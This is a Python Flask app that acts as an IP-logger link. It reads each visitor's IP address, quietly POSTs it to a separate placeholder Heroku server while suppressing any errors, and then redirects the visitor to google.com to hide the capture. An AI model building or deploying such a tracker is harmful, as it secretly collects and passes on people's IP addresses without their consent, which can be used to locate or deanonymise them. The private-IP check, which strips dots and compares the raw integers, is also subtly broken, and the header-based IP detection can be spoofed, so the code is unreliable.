import re
from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# Function to check if the IP is a private IP
def is_private_ip(ip):
    private_ip_ranges = [
        ("10.0.0.0", "10.255.255.255"),
        ("172.16.0.0", "172.31.255.255"),
        ("192.168.0.0", "192.168.255.255"),
        ("127.0.0.0", "127.255.255.255")
    ]
    
    # Convert the IP into integer format for easier comparison
    ip_int = int(ip.replace('.', ''))
    
    for start, end in private_ip_ranges:
        start_int = int(start.replace('.', ''))
        end_int = int(end.replace('.', ''))
        
        if start_int <= ip_int <= end_int:
            return True
    return False

# Route to handle the redirect and logging of IP
@app.route('/')
def home():
    return redirect('/redirect')

@app.route('/redirect', methods=['GET'])
def send_ip_and_redirect():
    # Get the real client IP address from the X-Forwarded-For header.
    # The X-Forwarded-For header may contain multiple IP addresses (proxy chain),
    # with the first being the client IP.
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    
    if x_forwarded_for:
        # Extract each IP from the comma-separated list
        ip_list = [ip.strip() for ip in x_forwarded_for.split(',')]
        
        # Loop through each IP to find the first public IP
        for ip in ip_list:
            if not is_private_ip(ip):
                client_ip = ip
                break
        else:
            # Fallback to the last proxy IP if no public IP is found
            client_ip = ip_list[-1]
    else:
        # If X-Forwarded-For is not present, fallback to remote address
        client_ip = request.remote_addr

    # Print the client IP to the console (for debugging)
    print(f"Client IP: {client_ip}")

    # Send the IP address to another server
    target_server_url = "https://your-heroku-app.herokuapp.com/log_ip"  # Replace with your target server URL
    payload = {"ip": client_ip}

    try:
        # Send the IP as a POST request
        requests.post(target_server_url, json=payload)
    except Exception as e:
        pass

    # Redirect the user to google.com
    target_url = "https://google.com"  # You can change this to any URL
    return redirect(target_url)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
